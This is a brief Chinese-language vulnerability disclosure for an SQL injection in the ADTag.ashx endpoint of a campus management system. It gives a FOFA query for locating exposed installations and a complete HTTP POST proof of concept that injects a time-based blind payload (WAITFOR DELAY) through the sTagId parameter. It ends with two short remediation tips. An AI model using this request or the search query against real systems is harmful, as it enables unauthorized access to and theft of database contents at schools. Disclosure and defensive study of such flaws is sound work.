## 智慧校园(安校易)管理系统 ADTag.ashx SQL注入漏洞

## 漏洞描述
`ADTag.ashx` 控制器同样未对 `sTagId` 进行过滤，攻击者可构造 `WAITFOR DELAY` 语句进行时间盲注，进一步窃取数据库数据。

## 资产测绘
```
fofa: title="智慧综合管理平台登入"
```

## POC
```
POST /Module/BPCJ/AD_Tag/Controller/ADTag.ashx HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Connection: close

action=exportExcel&sTagId=';WAITFOR+DELAY+'0:0:5'--
```

## 修复建议
- 对接口参数做严格的数字/UUID白名单校验
- 数据库侧增加最小权限并关闭危险扩展

